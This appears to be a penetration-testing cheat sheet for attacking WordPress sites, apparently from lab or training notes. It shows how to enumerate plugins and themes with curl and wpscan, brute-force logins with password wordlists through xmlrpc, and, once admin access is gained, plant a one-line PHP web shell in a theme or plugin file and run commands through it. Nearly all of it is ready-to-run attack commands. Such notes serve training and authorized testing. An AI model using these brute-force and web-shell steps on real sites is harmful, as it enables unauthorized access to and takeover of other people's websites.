# Find installed plugins and themes

```sh
curl -s "http://$target/" | grep -i 'plugins'
curl -s "http://$target/" | grep -i 'themes'
```
# Find versions of those plugins

Unreliable

Example, if you found this plugins

```html
<p><a href="http://wordpress.org/plugins/wp-sitemap-page/">Powered by "WP Sitemap Page"</a></p></div></strong></p>
```

Go to the plugin's github page, see if there is any `changelog`, `readme`, etc

Then grab that file

```sh
curl -s "http://$target/wp-content/plugins/wp-sitemap-page/readme.txt"
```

# `wpscan`

Install

```sh
sudo gem install wpscan
```

Scan all plugins and themes

```sh
wpscan --url "http://$target" -e ap,at -t 500
```

Scan vulnerable plugins and themes

```sh
wpscan --url "http://$target" -e vp,vt -t 500
```

Login brute-force

```sh
wpscan --url "http://$target" -e u -U ./wpusers -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/darkweb2017_top-100.txt -t 500
```

## Login bruteforce

```sh
wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

# RCE?

if get admin, go to theme or plugins, edit the theme/plugin, choose a php file, add this

```PHP
system($_REQUEST['cmd']);

```
Then browse to that php file like this:

```sh
curl -s "http://$target/wp-content/<themes or plugins>/<theme name>/<php file edited>.php?cmd=id"
```